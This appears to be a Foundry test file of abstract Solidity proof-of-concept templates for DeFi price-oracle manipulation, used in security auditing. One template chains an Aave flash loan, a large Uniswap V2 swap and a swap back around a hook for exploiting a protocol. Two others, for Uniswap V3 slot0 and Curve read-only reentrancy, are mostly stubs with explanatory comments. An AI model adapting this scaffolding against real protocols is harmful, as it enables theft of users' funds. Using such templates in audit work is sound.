// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../foundry/base_test.sol";
import "./flash_loan_poc.sol";

// Uniswap V2 interfaces
interface IUniswapV2Pair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function token0() external view returns (address);
    function token1() external view returns (address);
    function sync() external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

// Uniswap V3 interfaces
interface IUniswapV3Pool {
    function slot0() external view returns (
        uint160 sqrtPriceX96,
        int24 tick,
        uint16 observationIndex,
        uint16 observationCardinality,
        uint16 observationCardinalityNext,
        uint8 feeProtocol,
        bool unlocked
    );

    function observe(uint32[] calldata secondsAgos) external view returns (
        int56[] memory tickCumulatives,
        uint160[] memory secondsPerLiquidityCumulativeX128s
    );

    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
}

/**
 * @title OracleManipulationPoC
 * @notice Template for oracle manipulation attacks
 *
 * Common patterns:
 * 1. Flash loan -> swap to manipulate AMM reserves -> borrow against inflated price -> repay
 * 2. Use spot price from getReserves() instead of TWAP
 * 3. Manipulate Uniswap V3 slot0 (no TWAP)
 */
abstract contract OracleManipulationPoC is FlashLoanPoC {
    IUniswapV2Router constant UNISWAP_V2_ROUTER = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    // The AMM pool to manipulate
    IUniswapV2Pair internal targetPool;

    // The protocol using the vulnerable oracle
    address internal vulnerableProtocol;

    function test_oracleManipulation() public asAttacker {
        console.log("=== Starting Oracle Manipulation Attack ===");

        // Step 1: Record price before manipulation
        (uint112 reserve0Before, uint112 reserve1Before,) = targetPool.getReserves();
        uint256 priceBefore = uint256(reserve1Before) * 1e18 / uint256(reserve0Before);
        console.log("Price before:", priceBefore);

        // Step 2: Flash loan to get capital for manipulation
        flashToken = targetPool.token0(); // or token1
        flashAmount = 1_000_000 ether; // Large amount to move price

        AAVE_POOL.flashLoanSimple(
            address(this),
            flashToken,
            flashAmount,
            "",
            0
        );

        // Step 3: Verify profit
        console.log("=== Attack Complete ===");
    }

    function _executeAttack(address asset, uint256 amount) internal override {
        // Step 1: Approve and swap to manipulate price
        IERC20(asset).approve(address(UNISWAP_V2_ROUTER), amount);

        address[] memory path = new address[](2);
        path[0] = asset;
        path[1] = targetPool.token1();

        // Large swap to move price
        UNISWAP_V2_ROUTER.swapExactTokensForTokens(
            amount,
            0, // Accept any amount out
            path,
            address(this),
            block.timestamp
        );

        // Step 2: Price is now manipulated - exploit the vulnerable protocol
        (uint112 reserve0After, uint112 reserve1After,) = targetPool.getReserves();
        uint256 priceAfter = uint256(reserve1After) * 1e18 / uint256(reserve0After);
        console.log("Price after manipulation:", priceAfter);

        _exploitManipulatedPrice();

        // Step 3: Swap back to repay flash loan
        _swapBack(asset);
    }

    /// @notice Override this to exploit the manipulated price
    function _exploitManipulatedPrice() internal virtual {
        // Example: Borrow against inflated collateral
        // Example: Liquidate positions at wrong price
        // Example: Mint tokens at wrong exchange rate
    }

    function _swapBack(address asset) internal virtual {
        // Swap back to get enough tokens to repay flash loan
        address otherToken = targetPool.token0() == asset ? targetPool.token1() : targetPool.token0();
        uint256 balance = IERC20(otherToken).balanceOf(address(this));

        IERC20(otherToken).approve(address(UNISWAP_V2_ROUTER), balance);

        address[] memory path = new address[](2);
        path[0] = otherToken;
        path[1] = asset;

        UNISWAP_V2_ROUTER.swapExactTokensForTokens(
            balance,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}

/**
 * @title Slot0ManipulationPoC
 * @notice Template for Uniswap V3 slot0 manipulation (no TWAP protection)
 */
abstract contract Slot0ManipulationPoC is FlashLoanPoC {
    IUniswapV3Pool internal targetV3Pool;

    function test_slot0Manipulation() public asAttacker {
        console.log("=== Starting Slot0 Manipulation Attack ===");

        // Step 1: Get current spot price from slot0
        (uint160 sqrtPriceBefore,,,,,, ) = targetV3Pool.slot0();
        console.log("sqrtPriceX96 before:", sqrtPriceBefore);

        // Step 2: Flash loan and swap to manipulate slot0
        // ... implement with swap

        // Step 3: slot0 is now manipulated
        (uint160 sqrtPriceAfter,,,,,, ) = targetV3Pool.slot0();
        console.log("sqrtPriceX96 after:", sqrtPriceAfter);

        // Step 4: Exploit the vulnerable protocol reading slot0
        _exploitSlot0();
    }

    function _exploitSlot0() internal virtual {
        // Protocols reading slot0().sqrtPriceX96 directly are vulnerable
        // TWAP should be used instead: observe()
    }

    function _executeAttack(address asset, uint256 amount) internal override {
        // Implement V3 swap to manipulate slot0
    }
}

/**
 * @title CurveManipulationPoC
 * @notice Template for Curve pool virtual price manipulation
 */
abstract contract CurveManipulationPoC is BaseExploitTest {
    // Curve pool interface
    interface ICurvePool {
        function get_virtual_price() external view returns (uint256);
        function add_liquidity(uint256[2] calldata amounts, uint256 min_mint_amount) external payable returns (uint256);
        function remove_liquidity(uint256 amount, uint256[2] calldata min_amounts) external returns (uint256[2] memory);
    }

    ICurvePool internal targetCurvePool;

    function test_curveManipulation() public asAttacker {
        console.log("=== Starting Curve Virtual Price Manipulation ===");

        // Get virtual price before
        uint256 vpBefore = targetCurvePool.get_virtual_price();
        console.log("Virtual price before:", vpBefore);

        // Add large liquidity to manipulate
        // During add_liquidity callback, virtual price is temporarily wrong

        // Protocols reading get_virtual_price during callback are vulnerable
        // This is read-only reentrancy
    }
}
